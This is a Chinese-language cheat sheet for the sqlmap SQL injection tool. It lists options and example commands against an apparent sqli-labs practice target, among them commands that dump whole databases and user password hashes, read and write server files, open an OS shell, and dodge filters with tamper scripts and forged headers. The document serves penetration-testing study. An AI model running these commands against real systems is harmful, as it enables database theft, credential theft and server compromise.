## SQLmap

Sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL进行SQL注入，采用了5种SQL注入技术；

- 联合查询
- 报错注入
- 堆叠查询
- 布尔盲注
- 延时注入

---

基础操作

```
-u：指定目标URL（可以是HTTP协议也可以是HTTPS协议）

-d：连接数据库

-D：选择使用哪个数据库

-T：选择使用哪个表

-C：选择使用哪个列

-r：加载文件中的HTTP请求（本地保存的请求包txt文件）

-l：加载文件中的HTTP请求（本地保存的请求包日志文件）

-data：data指定的数据会当做POST数据提交

-c：指定配置文件，会按照该配置文件执行动作

--delay：设置多久访问一次

--param-del="分割符"：设置参数的分割符

--timeout：设定超时时间

--thread 最大为10：设置多线程
```

数据库操作

```
--dbs：列出所有的数据库

--current-db：列出当前数据库

--tables：列出当前的表

--columns：列出当前的列

--dump：获取字段中的数据
```

高级操作

```
--batch：自动选择yes

--smart：启发式快速判断，节约浪费时间

--forms：尝试使用POST注入

-g：自动获取Google搜索的前一百个结果，对有GET参数的URL测试

-o：开启所有默认性能优化

--tamper：调用脚本进行注入

-v：指定SQLMap的回显等级

--os-shell：获取主机shell，一般不太好用，因为没权限

-m：批量操作

--level：设置注入探测等级

--risk：风险等级

--identify-waf：检测防火墙类型

--skip-urlencode：不进行URL编码

--keep-alive：设置持久连接，加快探测速度

--null-connection：检索没有body响应的内容，多用于盲注
```

在探测目标URL是否存在漏洞的过程中，Sqlmap会和我们进行交互。

- 第一处交互的地方是说这个目标系统的数据库好像是Mysql数据库，是否还探测其他类型的数据库。我们选择 n，就不探测其他类型的数据库了，因为我们已经知道目标系统是Mysql数据库了。
- 第二处交互的地方是说 对于剩下的测试，问我们是否想要使用扩展提供的级别(1)和风险(1)值的“MySQL”的所有测试吗？ 我们选择 y。
- 第三处交互是说已经探测到参数id存在漏洞了，是否还探测其他地方，我们选择 n 不探测其他参数了 。
- 最后sqlmap就列出了参数id存在的注入类型是boolean盲注，还有payload其他信息也显示出来了，最后还列出了目标系统的版本，php，apache等信息。

---

> 简单使用：

```sh
sqlmap -r http.txt   #http.txt是我们抓取的http的请求包
sqlmap -r http.txt -p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"   #探测该url是否存在漏洞
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --cookie="抓取的cookie"   #当该网站需要登录时，探测该url是否存在漏洞
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --data="uname=admin&passwd=admin&submit=Submit"  #抓取其post提交的数据填入
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --users      #查看数据库的所有用户
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --passwords  #查看数据库用户名的密码
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --current-user  #查看数据库当前的用户
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --is-dba    #判断当前用户是否有管理员权限
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --roles     #列出数据库所有管理员角色，仅适用于oracle数据库的时候

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --dbs        #爆出所有的数据库
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --tables     #爆出所有的数据表
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --columns    #爆出数据库中所有的列
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --current-db #查看当前的数据库
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --tables #爆出数据库security中的所有的表
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --columns #爆出security数据库中users表中的所有的列
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump  #爆出数据库security中的users表中的username列中的所有数据

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --dump-all #爆出数据库security中的users表中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --dump-all   #爆出数据库security中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dump-all  #爆出该数据库中的所有数据

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --tamper=space2comment.py  #指定脚本进行过滤，用/**/代替空格
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --level=5 --risk=3 #探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入。
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --sql-shell  #执行指定的sql语句
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-shell/--os-cmd   #执行--os-shell命令，获取目标服务器权限

sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-read "c:/test.txt" #读取目标服务器C盘下的test.txt文件
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-write  test.txt  --file-dest "e:/hack.txt"  #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt

sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --dbms="MySQL"     #指定其数据库为mysql Firebird, HSQLDB, IBM DB2, Informix, Microsoft Access, Microsoft SQL Server, MySQL, Oracle, PostgreSQL, SAP MaxDB, SQLite, Sybase
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --random-agent   #使用任意的User-Agent爆破
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --proxy="http://127.0.0.1:8080"    #指定代理
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --technique T    #指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，我们也可以直接手工指定。
支持的探测方式如下：
　　B: Boolean-based blind SQL injection（布尔型注入）
　　E: Error-based SQL injection（报错型注入）
　　U: UNION query SQL injection（可联合查询注入）
　　S: Stacked queries SQL injection（可多语句查询注入）
　　T: Time-based blind SQL injection（基于时间延迟注入）

-v3                   #输出详细度  最大值5 会显示请求包和回复包
--threads 5           #指定线程数
--fresh-queries       #清除缓存
--flush-session       #清空会话，重构注入
--batch               #对所有的交互式的都是默认的
--random-agent        #任意的http头
--tamper base64encode            #对提交的数据进行base64编码
--referer http://www.baidu.com   #伪造referer字段

--keep-alive     保持连接，当出现 [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s) 保错的时候，使用这个参数
```

